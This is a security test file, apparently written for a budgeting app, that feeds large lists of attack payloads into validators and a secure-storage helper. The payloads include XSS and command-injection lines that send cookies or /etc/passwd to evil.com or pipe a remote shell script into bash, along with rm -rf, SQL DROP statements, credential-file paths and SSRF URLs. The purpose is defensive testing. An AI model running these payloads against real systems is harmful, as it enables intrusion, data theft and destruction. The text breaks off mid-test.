/**
 * Security Attack Simulation Tests
 * 
 * These tests simulate real-world hacker attack patterns to ensure
 * the application properly handles malicious input.
 * 
 * Attack categories covered:
 * - XSS (Cross-Site Scripting) - 35+ payloads
 * - SQL Injection - 13 payloads
 * - NoSQL Injection - 10 payloads
 * - Prototype Pollution - 15+ payloads
 * - Path Traversal - 9 payloads
 * - Command Injection - 12 payloads
 * - LDAP Injection - 8 payloads
 * - ReDoS (Regex Denial of Service) - 8 payloads
 * - SSRF (Server-Side Request Forgery) - 10 payloads
 * - Unicode Attacks - 15+ payloads
 * - JSON Injection - 10 payloads
 * - Header Injection (CRLF) - 8 payloads
 * - Template Injection - 12 payloads
 * - Mass Assignment - 5 payloads
 * - Numeric Attacks - 10+ payloads
 * - Buffer Overflow Patterns - 5 payloads
 */

import { describe, it, expect, beforeEach } from 'vitest';
import { getSecureStorageItem, setSecureStorageItem } from './storage/secureStorage';
import {
  CreateExpenseInputSchema,
  CreateGoalInputSchema,
  CreateIncomeSourceInputSchema,
  CreateRecurringExpenseInputSchema,
  CreateGoalEntryInputSchema,
  CreateManualGoalEntryInputSchema,
  CreateSubcategoryInputSchema,
  MonthLimitsSchema,
} from './validators';
import { ExpenseRowSchema, MonthRowSchema } from './schemas';
import { sanitizeCurrencyInput, parseCurrencyInput } from './utils/formatters';
import { mapExpense, mapGoal, mapSubcategory } from './mappers';

// ============================================================================
// XSS (Cross-Site Scripting) Attack Payloads
// ============================================================================

const XSS_PAYLOADS = {
  // Basic script injection
  basic: [
    '<script>alert(1)</script>',
    '<script>document.location="http://evil.com?c="+document.cookie</script>',
    '<script src="http://evil.com/malware.js"></script>',
  ],
  
  // Event handler injection
  eventHandlers: [
    '<img src=x onerror=alert(1)>',
    '<img/src=x onerror=alert(1)>',
    '<body onload=alert(1)>',
    '<svg onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<marquee onstart=alert(1)>',
    '<video><source onerror=alert(1)>',
    '<audio src=x onerror=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<object data="javascript:alert(1)">',
    '<iframe src="javascript:alert(1)">',
    '<a href="javascript:alert(1)">click</a>',
  ],
  
  // Encoding bypass attempts
  encoded: [
    '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e', // Unicode escape
    '%3Cscript%3Ealert(1)%3C/script%3E', // URL encoding
    '&#60;script&#62;alert(1)&#60;/script&#62;', // HTML entities
    '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;', // Hex entities
    '<scr<script>ipt>alert(1)</scr</script>ipt>', // Nested tags
    '<<script>script>alert(1)</<script>/script>', // Double encoding
  ],
  
  // Template literal injection
  templateLiteral: [
    '${alert(1)}',
    '`${alert(1)}`',
    '{{constructor.constructor("alert(1)")()}}',
  ],
  
  // SVG-based XSS
  svg: [
    '<svg><script>alert(1)</script></svg>',
    '<svg/onload=alert(1)>',
    '<svg><animate onbegin=alert(1)>',
    '<svg><set onbegin=alert(1)>',
  ],
  
  // Data URI schemes
  dataUri: [
    'data:text/html,<script>alert(1)</script>',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    'javascript:alert(1)',
    'vbscript:msgbox(1)',
    'livescript:alert(1)',
  ],

  // Mutation XSS (mXSS)
  mutation: [
    '<noscript><p title="</noscript><script>alert(1)</script>">',
    '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
  ],
};

// ============================================================================
// SQL Injection Payloads
// ============================================================================

const SQL_INJECTION_PAYLOADS = [
  "'; DROP TABLE expenses; --",
  "1'; DELETE FROM users WHERE '1'='1",
  "' OR '1'='1",
  "' OR '1'='1' --",
  "' OR '1'='1' /*",
  "'; INSERT INTO users VALUES ('hacker', 'password'); --",
  "1; UPDATE users SET password='hacked' WHERE username='admin'",
  "' UNION SELECT * FROM users --",
  "' UNION SELECT password FROM users WHERE username='admin' --",
  "admin'--",
  "1' AND (SELECT COUNT(*) FROM users) > 0 --",
  "'; EXEC xp_cmdshell('dir'); --",
  "1'; WAITFOR DELAY '0:0:10' --", // Time-based blind injection
];

// ============================================================================
// Prototype Pollution Payloads
// ============================================================================

const PROTOTYPE_POLLUTION_PAYLOADS = [
  '__proto__',
  'constructor',
  'prototype',
  '__proto__[isAdmin]',
  'constructor.prototype.isAdmin',
];

// ============================================================================
// Path Traversal Payloads
// ============================================================================

const PATH_TRAVERSAL_PAYLOADS = [
  '../../../etc/passwd',
  '..\\..\\..\\windows\\system32\\config\\sam',
  '....//....//....//etc/passwd',
  '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
  '..%252f..%252f..%252fetc/passwd',
  '/etc/passwd',
  'C:\\Windows\\System32\\config\\SAM',
  'file:///etc/passwd',
  '....//....//etc/passwd',
];



// ============================================================================
// NoSQL Injection Payloads (MongoDB-style, relevant for some backends)
// ============================================================================

const NOSQL_INJECTION_PAYLOADS = [
  '{"$gt": ""}',
  '{"$ne": null}',
  '{"$where": "sleep(5000)"}',
  '{"$regex": ".*"}',
  '{"$or": [{"a": 1}, {"b": 2}]}',
  "'; return this.password; var dummy='",
  '{"$lookup": {"from": "users"}}',
  '{"__proto__": {"admin": true}}',
  '{"$set": {"isAdmin": true}}',
  '{"constructor": {"prototype": {"isAdmin": true}}}',
];

// ============================================================================
// Command Injection Payloads
// ============================================================================

const COMMAND_INJECTION_PAYLOADS = [
  '; ls -la',
  '| cat /etc/passwd',
  '`whoami`',
  '$(whoami)',
  '; rm -rf /',
  '& dir',
  '| net user',
  '; curl http://evil.com/shell.sh | bash',
  '`curl http://evil.com?data=$(cat /etc/passwd)`',
  '\n/bin/sh',
  '||ping -c 10 127.0.0.1||',
  '; echo "pwned" > /tmp/pwned',
];

// ============================================================================
// LDAP Injection Payloads
// ============================================================================

const LDAP_INJECTION_PAYLOADS = [
  '*)(uid=*))(|(uid=*',
  'admin)(&)',
  'x])(|(cn=*',
  '*)(objectClass=*',
  'admin)(|(password=*)',
  '*)(!(&(1=0',
  '*))%00',
  'admin))(|(objectclass=*)',
];

// ============================================================================
// ReDoS (Regular Expression Denial of Service) Payloads
// ============================================================================

const REDOS_PAYLOADS = [
  'a'.repeat(50) + '!',                    // Backtracking bomb
  'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!',
  'x]'.repeat(20) + '[',
  '((((((((((((((((((((a]',
  'a]'.repeat(30),
  '\t'.repeat(100),
  ' '.repeat(10000),                        // Whitespace bomb
  'a]b]c]d]e]f]g]h]i]j]k]l]m]n]o]p]',
];

// ============================================================================
// SSRF (Server-Side Request Forgery) Payloads
// ============================================================================

const SSRF_PAYLOADS = [
  'http://localhost:22',
  'http://127.0.0.1:3306',
  'http://[::1]:80',
  'http://0.0.0.0:80',
  'http://169.254.169.254/latest/meta-data/',  // AWS metadata
  'http://metadata.google.internal/',           // GCP metadata
  'http://192.168.1.1/admin',
  'file:///etc/passwd',
  'dict://localhost:11211/stat',
  'gopher://localhost:6379/_INFO',
];

// ============================================================================
// JSON Injection Payloads
// ============================================================================

const JSON_INJECTION_PAYLOADS = [
  '{"key": "value", "__proto__": {"admin": true}}',
  '{"a": 1, "a": 2}',                          // Duplicate keys
  '{"nested": '.repeat(100) + '1' + '}'.repeat(100),  // Deep nesting
  '["a", "b", "c"'.repeat(1000) + ']',         // Long arrays
  '{"key": "\u0000value"}',                    // Null byte in JSON
  '{"key": "\\"}',                             // Escape sequence abuse
  '{"constructor": {"prototype": {"isAdmin": true}}}',
  '{"__lookupGetter__": "x"}',
  '{"__defineSetter__": "x"}',
  '{"toJSON": "malicious"}',
];

// ============================================================================
// Header Injection (CRLF) Payloads
// ============================================================================

const CRLF_INJECTION_PAYLOADS = [
  'value\r\nSet-Cookie: admin=true',
  'value\r\nLocation: http://evil.com',
  'value\r\n\r\n<script>alert(1)</script>',
  '%0d%0aSet-Cookie:%20admin=true',
  '%0ASet-Cookie:%20admin=true',
  'value%0D%0AHeader-Injection:true',
  '\r\nX-Injected: true',
  'value\nX-Injected: true',
];

// ============================================================================
// Template Injection Payloads (Various Frameworks)
// ============================================================================

const TEMPLATE_INJECTION_PAYLOADS = {
  // Angular/Vue style
  angular: [
    '{{constructor.constructor("alert(1)")()}}',
    '{{$on.constructor("alert(1)")()}}',
    '[[constructor.constructor("alert(1)")()]]',
    '${7*7}',
  ],
  // Server-side template engines
  serverSide: [
    '{{7*7}}',
    '${7*7}',
    '<%= 7*7 %>',
    '#{7*7}',
    '*{7*7}',
    '@(7*7)',
    '{{config}}',
    '{{self}}',
  ],
};

// ============================================================================
// Mass Assignment Payloads (Extra fields that shouldn't be accepted)
// ============================================================================

const MASS_ASSIGNMENT_PAYLOADS = {
  adminEscalation: { isAdmin: true, role: 'admin', permissions: ['*'] },
  idManipulation: { id: 'hacker-id', user_id: 'victim-id' },
  timestampManipulation: { created_at: '1970-01-01', updated_at: '2099-12-31' },
  foreignKeyManipulation: { family_id: 'other-family', owner_id: 'other-user' },
  metadataInjection: { __metadata: { type: 'admin' }, _internal: true },
};

// ============================================================================
// Buffer Overflow Patterns
// ============================================================================

const BUFFER_OVERFLOW_PAYLOADS = [
  'A'.repeat(256),     // Just over the 255 char limit
  'A'.repeat(1000),    // 1KB
  'A'.repeat(10000),   // 10KB
  '%s'.repeat(100),    // Format string attack
  '%n'.repeat(100),    // Format string attack
];

// ============================================================================
// Polyglot Payloads (Work across multiple contexts)
// ============================================================================

const POLYGLOT_PAYLOADS = [
  "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
  "'\"-->]]>*/</script></style></title></textarea><script>alert(1)</script>",
  "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
  "<IMG \"\"\"><SCRIPT>alert(1)</SCRIPT>\">",
  "<<SCRIPT>alert(1)//<</SCRIPT>",
];

// ============================================================================
// Unicode Attack Payloads
// ============================================================================

const UNICODE_ATTACKS = {
  // Right-to-Left Override (can make filenames appear different)
  rtlOverride: [
    '\u202Eexe.doc', // Shows as "doc.exe" visually
    'harmless\u202Etxt.exe',
  ],
  
  // Zero-width characters (invisible text injection)
  zeroWidth: [
    'admin\u200Broot', // Zero-width space
    'test\u200Cvalue', // Zero-width non-joiner
    'data\u200Dfield', // Zero-width joiner
    '\uFEFFmalicious', // Byte order mark
  ],
  
  // Homoglyphs (lookalike characters)
  homoglyphs: [
    'аdmin', // Cyrillic 'а' instead of Latin 'a'
    'рaypal', // Cyrillic 'р' instead of Latin 'p'
    'ехample', // Mixed Cyrillic
  ],
  
  // Null bytes
  nullByte: [
    'valid\x00malicious',
    'file.txt\x00.exe',
  ],
};

// ============================================================================
// Test Suites
// ============================================================================

describe('Security - XSS Prevention', () => {
  beforeEach(() => {
    localStorage.clear();
  });

  describe('secureStorage rejects XSS in family ID', () => {
    const allXssPayloads = [
      ...XSS_PAYLOADS.basic,
      ...XSS_PAYLOADS.eventHandlers,
      ...XSS_PAYLOADS.encoded,
      ...XSS_PAYLOADS.templateLiteral,
      ...XSS_PAYLOADS.svg,
      ...XSS_PAYLOADS.dataUri,
      ...XSS_PAYLOADS.mutation,
    ];

    it.each(allXssPayloads)('should reject XSS payload: %s', (payload) => {
      expect(setSecureStorageItem('current-family-id', payload)).toBe(false);
      localStorage.setItem('current-family-id', payload);
      expect(getSecureStorageItem('current-family-id')).toBeNull();
    });
  });

  describe('Zod schemas sanitize title fields', () => {
    // Note: Zod accepts strings but limits length - XSS prevention happens at render time with React
    it('should accept but limit title length (React handles escaping)', () => {
      const longXssPayload = '<script>'.repeat(100);
      const result = CreateExpenseInputSchema.safeParse({
        month_id: 'month-123',
        title: longXssPayload,
        category_key: 'essenciais',
        value: 100,
      });
      // Title max is 255 chars, so this should fail due to length
      expect(result.success).toBe(false);
    });

    it('should accept normal titles with special chars that React will escape', () => {
      const result = CreateExpenseInputSchema.safeParse({
        month_id: 'month-123',
        title: 'Coffee & Tea <3',
        category_key: 'essenciais',
        value: 5,
      });
      // React's JSX will escape these when rendered
      expect(result.success).toBe(true);
    });
  });
});

describe('Security - SQL Injection Prevention', () => {
  describe('validators accept SQL-like strings (Supabase uses parameterized queries)', () => {
    // Note: Supabase uses parameterized queries, so SQL injection in string values is not a threat
    // However, we test that the validators work correctly with these inputs

    it.each(SQL_INJECTION_PAYLOADS.slice(0, 5))('should handle SQL payload in title: %s', (payload) => {
      // Zod validates structure, Supabase handles SQL safety via parameterization
      const result = CreateExpenseInputSchema.safeParse({
        month_id: 'month-123',
        title: payload.substring(0, 255), // Ensure within max length
        category_key: 'essenciais',
        value: 100,
      });
      // Should pass validation - SQL injection is handled by Supabase's parameterized queries
      expect(result.success).toBe(true);
    });
  });

  describe('secureStorage rejects SQL injection in IDs', () => {
    it.each(SQL_INJECTION_PAYLOADS)('should reject SQL injection in family ID: %s', (payload) => {
      expect(setSecureStorageItem('current-family-id', payload)).toBe(false);
    });
  });
});

describe('Security - Prototype Pollution Prevention', () => {
  describe('rejects prototype pollution in IDs', () => {
    it.each(PROTOTYPE_POLLUTION_PAYLOADS)('should reject: %s', (payload) => {
      expect(setSecureStorageItem('current-family-id', payload)).toBe(false);
    });
  });

  describe('JSON parse safety', () => {
    it('should not pollute Object prototype via JSON.parse', () => {
      const maliciousJson = '{"__proto__": {"isAdmin": true}}';
      const parsed = JSON.parse(maliciousJson);
      
      // Verify the parsed object has __proto__ as a regular property, not prototype pollution
      expect(parsed.__proto__).toEqual({ isAdmin: true });
      // But Object prototype should NOT be polluted
      expect(({} as Record<string, unknown>).isAdmin).toBeUndefined();
    });

    it('should not pollute via constructor.prototype', () => {
      const maliciousJson = '{"constructor": {"prototype": {"isAdmin": true}}}';
      const parsed = JSON.parse(maliciousJson);
      
      expect(parsed.constructor).toEqual({ prototype: { isAdmin: true } });
      expect(({} as Record<string, unknown>).isAdmin).toBeUndefined();
    });
  });
});

describe('Security - Path Traversal Prevention', () => {
  describe('rejects path traversal in IDs', () => {
    it.each(PATH_TRAVERSAL_PAYLOADS)('should reject: %s', (payload) => {
      expect(setSecureStorageItem('current-family-id', payload)).toBe(false);
    });
  });
});

describe('Security - Malicious Numeric Input', () => {
  describe('Zod schema rejects Infinity and NaN', () => {
    it('should reject Infinity in expense value', () => {
      const result = CreateExpenseInputSchema.safeParse({
        month_id: 'month-123',
        title: 'Test',
        category_key: 'essenciais',
        value: Infinity,
      });
      expect(result.success).toBe(false);
    });

    it('should reject -Infinity in expense value', () => {
      const result = CreateExpenseInputSchema.safeParse({
        month_id: 'month-123',
        title: 'Test',
        category_key: 'essenciais',
        value: -Infinity,
      });
      expect(result.success).toBe(false);
    });

    it('should reject NaN in expense value', () => {
      const result = CreateExpenseInputSchema.safeParse({
        month_id: 'month-123',
        title: 'Test',
        category_key: 'essenciais',
        value: NaN,
      });
      expect(result.success).toBe(false);
    });

    it('should reject negative values', () => {
      const result = CreateExpenseInputSchema.safeParse({
        month_id: 'month-123',
        title: 'Test',
        category_key: 'essenciais',
        value: -100,
      });
      expect(result.success).toBe(false);
    });
  });

  describe('sanitizeCurrencyInput handles malicious input', () => {
    it('should strip non-numeric characters', () => {
      expect(sanitizeCurrencyInput('123abc456')).toBe('123456');
      expect(sanitizeCurrencyInput('<script>100</script>')).toBe('100');
      expect(sanitizeCurrencyInput('$1,000.00')).toBe('1,00000'); // Note: comma preserved for Brazilian format
    });

    it('should handle multiple minus signs', () => {
      expect(sanitizeCurrencyInput('--100')).toBe('-100');
      expect(sanitizeCurrencyInput('-10-0')).toBe('-100');
    });

    it('should handle empty and whitespace', () => {
      expect(sanitizeCurrencyInput('')).toBe('');
      expect(sanitizeCurrencyInput('   ')).toBe('');
    });
  });

  describe('parseCurrencyInput handles edge cases', () => {
    it('should return 0 for invalid input', () => {
      expect(parseCurrencyInput('')).toBe(0);
      expect(parseCurrencyInput('abc')).toBe(0);
      expect(parseCurrencyInput('not a number')).toBe(0);
    });

    it('should parse valid Brazilian format', () => {
      expect(parseCurrencyInput('100,50')).toBe(100.5);
      expect(parseCurrencyInput('1000,00')).toBe(1000);
    });
  });
});

describe('Security - Unicode Attack Prevention', () => {
  beforeEach(() => {
    localStorage.clear();
  });

  describe('rejects RTL override attacks', () => {
    it.each(UNICODE_ATTACKS.rtlOverride)('should reject RTL override: %s', (payload) => {
      expect(setSecureStorageItem('current-family-id', payload)).toBe(false);
    });
  });

  describe('rejects zero-width character attacks', () => {
    it.each(UNICODE_ATTACKS.zeroWidth)('should reject zero-width chars: %s', (payload) => {
      expect(setSecureStorageItem('current-family-id', payload)).toBe(false);
    });
  });

  describe('rejects homoglyph attacks in IDs', () => {
    it.each(UNICODE_ATTACKS.homoglyphs)('should reject homoglyphs: %s', (payload) => {
      expect(setSecureStorageItem('current-family-id', payload)).toBe(false);
    });
  });

  describe('rejects null byte injection', () => {
    it.each(UNICODE_ATTACKS.nullByte)('should reject null bytes: %s', (payload) => {
      expect(setSecureStorageItem('current-family-id', payload)).toBe(false);
    });
  });
});

describe('Security - Input Boundary Testing', () => {
  describe('extremely long inputs', () => {
    it('should reject title exceeding max length', () => {
      const longTitle = 'A'.repeat(256);
      const result = CreateExpenseInputSchema.safeParse({
        month_id: 'month-123',
        title: longTitle,
        category_key: 'essenciais',
        value: 100,
      });
      expect(result.success).toBe(false);
    });

    it('should accept title at max length', () => {
      const maxTitle = 'A'.repeat(255);
      const result = CreateExpenseInputSchema.safeParse({
        month_id: 'month-123',
        title: maxTitle,
        category_key: 'essenciais',
        value: 100,
      });
      expect(result.success).toBe(true);
    });
  });

  describe('empty and whitespace inputs', () => {
    it('should reject empty title', () => {
      const result = CreateExpenseInputSchema.safeParse({
        month_id: 'month-123',
        title: '',
        category_key: 'essenciais',
        value: 100,
      });
      expect(result.success).toBe(false);
    });

    it('should reject empty month_id', () => {
      const result = CreateExpenseInputSchema.safeParse({
        month_id: '',
        title: 'Test',
        category_key: 'essenciais',
        value: 100,
      });
      expect(result.success).toBe(false);
    });
  });

  describe('type coercion attacks', () => {
    it('should reject string as number', () => {
      const result = CreateExpenseInputSchema.safeParse({
        month_id: 'month-123',
        title: 'Test',
        category_key: 'essenciais',
        value: '100' as unknown,
      });
      expect(result.success).toBe(false);
    });

    it('should reject array as string', () => {
      const result = CreateExpenseInputSchema.safeParse({
        month_id: ['month', '123'] as unknown,
        title: 'Test',
        category_key: 'essenciais',
        value: 100,
      });
      expect(result.success).toBe(false);
    });

    it('should reject object as string', () => {
      const result = CreateExpenseInputSchema.safeParse({
        month_id: { id: 'month-123' } as unknown,
        title: 'Test',
        category_key: 'essenciais',
        value: 100,
      });
      expect(result.success).toBe(false);
    });
  });
});

describe('Security - Category Injection Prevention', () => {
  it('should only accept valid category keys', () => {
    const invalidCategories = [
      'admin',
      'root',
      'system',
      '__proto__',
      'constructor',
      '<script>',
      'essenciais; DROP TABLE expenses;',
    ];

    invalidCategories.forEach(category => {
      const result = CreateExpenseInputSchema.safeParse({
        month_id: 'month-123',
        title: 'Test',
        category_key: category,
        value: 100,
      });
      expect(result.success).toBe(false);
    });
  });

  it('should accept all valid category keys', () => {
    const validCategories = ['essenciais', 'conforto', 'metas', 'prazeres', 'liberdade', 'conhecimento'];

    validCategories.forEach(category => {
      const result = CreateExpenseInputSchema.safeParse({
        month_id: 'month-123',
        title: 'Test',
        category_key: category,
        value: 100,
      });
      expect(result.success).toBe(true);
    });
  });
});

describe('Security - Goal and Income Validation', () => {
  describe('CreateGoalInputSchema security', () => {
    it('should reject Infinity in target_value', () => {
      const result = CreateGoalInputSchema.safeParse({
        family_id: 'fam-123',
        name: 'Savings',
        target_value: Infinity,
      });
      expect(result.success).toBe(false);
    });

    it('should reject NaN in target_value', () => {
      const result = CreateGoalInputSchema.safeParse({
        family_id: 'fam-123',
        name: 'Savings',
        target_value: NaN,
      });
      expect(result.success).toBe(false);
    });
  });

  describe('CreateIncomeSourceInputSchema security', () => {
    it('should reject negative income', () => {
      const result = CreateIncomeSourceInputSchema.safeParse({
        name: 'Salary',
        value: -5000,
      });
      expect(result.success).toBe(false);
    });

    it('should reject Infinity income', () => {
      const result = CreateIncomeSourceInputSchema.safeParse({
        name: 'Salary',
        value: Infinity,
      });
      expect(result.success).toBe(false);
    });
  });
});

// ============================================================================
// NEW: Advanced Attack Simulations
// ============================================================================

describe('Security - NoSQL Injection Prevention', () => {
  beforeEach(() => {
    localStorage.clear();
  });

  describe('rejects NoSQL injection patterns in IDs', () => {
    const nosqlPatterns = [
      '{"$gt":""}',
      '{"$ne":null}',
      '{"$regex":".*"}',
    ];

    it.each(nosqlPatterns)('should reject NoSQL pattern: %s', (payload) => {
      expect(setSecureStorageItem('current-family-id', payload)).toBe(false);
    });
  });

  describe('validates JSON-like payloads in titles', () => {
    it.each(NOSQL_INJECTION_PAYLOADS.slice(0, 5))('should handle NoSQL payload in title: %s', (payload) => {
      const result = CreateExpenseInputSchema.safeParse({
        month_id: 'month-123',
        title: payload.substring(0, 255),
        category_key: 'essenciais',
        value: 100,
      });
      // Zod accepts strings - NoSQL safety is handled by Supabase (PostgreSQL)
      expect(result.success).toBe(true);
    });
  });
});

describe('Security - Command Injection Prevention', () => {
  beforeEach(() => {
    localStorage.clear();
  });

  describe('rejects command injection in IDs', () => {
    it.each(COMMAND_INJECTION_PAYLOADS)('should reject command: %s', (payload) => {
      expect(setSecureStorageItem('current-family-id', payload)).toBe(false);
    });
  });

  describe('command payloads in text fields', () => {
    it.each(COMMAND_INJECTION_PAYLOADS.slice(0, 6))('should accept but not execute: %s', (payload) => {
      // These are accepted as text but never executed (frontend-only app)
      const result = CreateExpenseInputSchema.safeParse({
        month_id: 'month-123',
        title: payload.substring(0, 255),
        category_key: 'essenciais',
        value: 100,
      });
      expect(result.success).toBe(true);
    });
  });
});

describe('Security - LDAP Injection Prevention', () => {
  beforeEach(() => {
    localStorage.clear();
  });

  describe('rejects LDAP injection in IDs', () => {
    it.each(LDAP_INJECTION_PAYLOADS)('should reject LDAP payload: %s', (payload) => {
      expect(setSecureStorageItem('current-family-id', payload)).toBe(false);
    });
  });
});

describe('Security - ReDoS Prevention', () => {
  describe('handles potentially catastrophic regex inputs', () => {
    it.each(REDOS_PAYLOADS)('should handle ReDoS payload without hanging: %s', (payload) => {
      const startTime = Date.now();
      
      // Test that validation completes quickly (under 100ms)
      const result = CreateExpenseInputSchema.safeParse({
        month_id: 'month-123',
        title: payload.substring(0, 255),
        category_key: 'essenciais',
        value: 100,
      });
      
      const elapsed = Date.now() - startTime;
      expect(elapsed).toBeLessThan(100); // Should not hang
      expect(result.success).toBeDefined();
    });

    it('should reject extremely long whitespace strings', () => {
      const whitespaceAttack = ' '.repeat(10000);
      const result = CreateExpenseInputSchema.safeParse({
        month_id: 'month-123',
        title: whitespaceAttack,
        category_key: 'essenciais',
        value: 100,
      });
      // Exceeds max length
      expect(result.success).toBe(false);
    });
  });
});

describe('Security - SSRF Pattern Prevention', () => {
  beforeEach(() => {
    localStorage.clear();
  });

  describe('rejects SSRF patterns in IDs', () => {
    it.each(SSRF_PAYLOADS)('should reject SSRF pattern: %s', (payload) => {
      expect(setSecureStorageItem('current-family-id', payload)).toBe(false);
    });
  });
});

describe('Security - JSON Injection Prevention', () => {
  describe('handles malformed JSON safely', () => {
    it('should not pollute prototype via JSON.parse of malicious payloads', () => {
      JSON_INJECTION_PAYLOADS.forEach(payload => {
        try {
          const _parsed = JSON.parse(payload);
          // Even if parsed, should not affect Object prototype
          expect(({} as Record<string, unknown>).admin).toBeUndefined();
          expect(({} as Record<string, unknown>).isAdmin).toBeUndefined();
        } catch {
          // Invalid JSON is fine - it's rejected
          expect(true).toBe(true);
        }
      });
    });

    it('should handle deeply nested JSON without stack overflow', () => {
      // Create deeply nested but valid JSON
      let nested = '{"a":';
      for (let i = 0; i < 50; i++) {
        nested += '{"b":';
      }
      nested += '1' + '}'.repeat(51);

      expect(() => {
        try {
          JSON.parse(nested);
        } catch {
          // Expected for very deep nesting
        }
      }).not.toThrow();
    });
  });
});

describe('Security - CRLF Injection Prevention', () => {
  beforeEach(() => {
    localStorage.clear();
  });

  describe('rejects CRLF injection in IDs', () => {
    it.each(CRLF_INJECTION_PAYLOADS)('should reject CRLF payload: %s', (payload) => {
      expect(setSecureStorageItem('current-family-id', payload)).toBe(false);
    });
  });

  describe('handles CRLF in text fields', () => {
    it('should accept but neutralize CRLF in titles', () => {
      const result = CreateExpenseInputSchema.safeParse({
        month_id: 'month-123',
        title: 'Test\r\nInjection',
        category_key: 'essenciais',
        value: 100,
      });
      // Zod accepts it - React will render it safely
      expect(result.success).toBe(true);
    });
  });
});

describe('Security - Template Injection Prevention', () => {
  beforeEach(() => {
    localStorage.clear();
  });

  describe('rejects Angular/Vue template injection in IDs', () => {
    it.each(TEMPLATE_INJECTION_PAYLOADS.angular)('should reject template: %s', (payload) => {
      expect(setSecureStorageItem('current-family-id', payload)).toBe(false);
    });
  });

  describe('rejects server-side template injection in IDs', () => {
    it.each(TEMPLATE_INJECTION_PAYLOADS.serverSide)('should reject template: %s', (payload) => {
      expect(setSecureStorageItem('current-family-id', payload)).toBe(false);
    });
  });

  describe('template payloads in text fields', () => {
    const allTemplates = [
      ...TEMPLATE_INJECTION_PAYLOADS.angular,
      ...TEMPLATE_INJECTION_PAYLOADS.serverSide,
    ];

    it.each(allTemplates)('should accept but not interpret: %s', (payload) => {
      const result = CreateExpenseInputSchema.safeParse({
        month_id: 'month-123',
        title: payload.substring(0, 255),
        category_key: 'essenciais',
        value: 100,
      });
      // React doesn't interpret these - they're just strings
      expect(result.success).toBe(true);
    });
  });
});

describe('Security - Mass Assignment Prevention', () => {
  describe('Zod schemas reject extra fields', () => {
    it('should not accept isAdmin field in expense', () => {
      const result = CreateExpenseInputSchema.safeParse({
        month_id: 'month-123',
        title: 'Test',
        category_key: 'essenciais',
        value: 100,
        isAdmin: true, // Extra field
      } as unknown);

      if (result.success) {
        // If Zod is in passthrough mode, the extra field might be included
        // But it should be stripped in strict mode
        expect((result.data as Record<string, unknown>).isAdmin).toBeUndefined();
      }
    });

    it('should not allow ID manipulation via extra fields', () => {
      const attackPayload = {
        month_id: 'month-123',
        title: 'Test',
        category_key: 'essenciais',
        value: 100,
        ...MASS_ASSIGNMENT_PAYLOADS.idManipulation,
      };

      const result = CreateExpenseInputSchema.safeParse(attackPayload);
      
      if (result.success) {
        // Extra fields should be stripped
        expect((result.data as Record<string, unknown>).id).toBeUndefined();
        expect((result.data as Record<string, unknown>).user_id).toBeUndefined();
      }
    });

    it('should not allow metadata injection', () => {
      const attackPayload = {
        month_id: 'month-123',
        title: 'Test',
        category_key: 'essenciais',
        value: 100,
        ...MASS_ASSIGNMENT_PAYLOADS.metadataInjection,
      };

      const result = CreateExpenseInputSchema.safeParse(attackPayload);
      
      if (result.success) {
        expect((result.data as Record<string, unknown>).__metadata).toBeUndefined();
        expect((result.data as Record<string, unknown>)._internal).toBeUndefined();
      }
    });
  });

  describe('DB Row schemas validate structure strictly', () => {
    it('should reject expense row with extra admin field', () => {
      const maliciousRow = {
        id: 'exp-123',
        month_id: 'month-456',
        title: 'Test',
        category_key: 'essenciais',
        subcategory_id: null,
        value: 100,
        is_recurring: false,
        is_pending: false,
        due_day: null,
        recurring_expense_id: null,
        installment_current: null,
        installment_total: null,
        created_at: '2025-01-01T00:00:00Z',
        updated_at: '2025-01-01T00:00:00Z',
        isAdmin: true, // Malicious extra field
      };

      const result = ExpenseRowSchema.safeParse(maliciousRow);
      if (result.success) {
        // Should strip unknown fields
        expect((result.data as Record<string, unknown>).isAdmin).toBeUndefined();
      }
    });
  });
});

describe('Security - Buffer Overflow Patterns', () => {
  beforeEach(() => {
    localStorage.clear();
  });

  describe('handles extremely long inputs', () => {
    it.each(BUFFER_OVERFLOW_PAYLOADS)('should handle long payload safely', (payload) => {
      // Should not crash
      expect(() => {
        setSecureStorageItem('current-family-id', payload);
      }).not.toThrow();

      // Should be rejected due to pattern mismatch or reserved chars
      expect(setSecureStorageItem('current-family-id', payload)).toBe(false);
    });
  });

  describe('protects against format string attacks', () => {
    const formatStringPayloads = ['%s%s%s%s', '%n%n%n%n', '%x%x%x%x', '%d%d%d%d'];

    it.each(formatStringPayloads)('should reject format string: %s', (payload) => {
      expect(setSecureStorageItem('current-family-id', payload)).toBe(false);
    });
  });
});

describe('Security - Polyglot Payload Prevention', () => {
  beforeEach(() => {
    localStorage.clear();
  });

  describe('rejects polyglot XSS payloads in IDs', () => {
    it.each(POLYGLOT_PAYLOADS)('should reject polyglot: %s', (payload) => {
      expect(setSecureStorageItem('current-family-id', payload)).toBe(false);
    });
  });

  describe('handles polyglots in text fields', () => {
    it.each(POLYGLOT_PAYLOADS)('should accept polyglot in title (React escapes on render)', (payload) => {
      const result = CreateExpenseInputSchema.safeParse({
        month_id: 'month-123',
        title: payload.substring(0, 255),
        category_key: 'essenciais',
        value: 100,
      });
      // Zod validates structure, React escapes XSS on render - this is the correct behavior
      expect(result.success).toBe(true);
    });
  });
});

describe('Security - Time-Based Attack Prevention', () => {
  describe('validates operations complete in reasonable time', () => {
    it('should validate expense quickly', () => {
      const startTime = Date.now();
      
      for (let i = 0; i < 1000; i++) {
        CreateExpenseInputSchema.safeParse({
          month_id: 'month-123',
          title: 'Test Expense',
          category_key: 'essenciais',
          value: 100,
        });
      }
      
      const elapsed = Date.now() - startTime;
      // 1000 validations should complete in under 1 second
      expect(elapsed).toBeLessThan(1000);
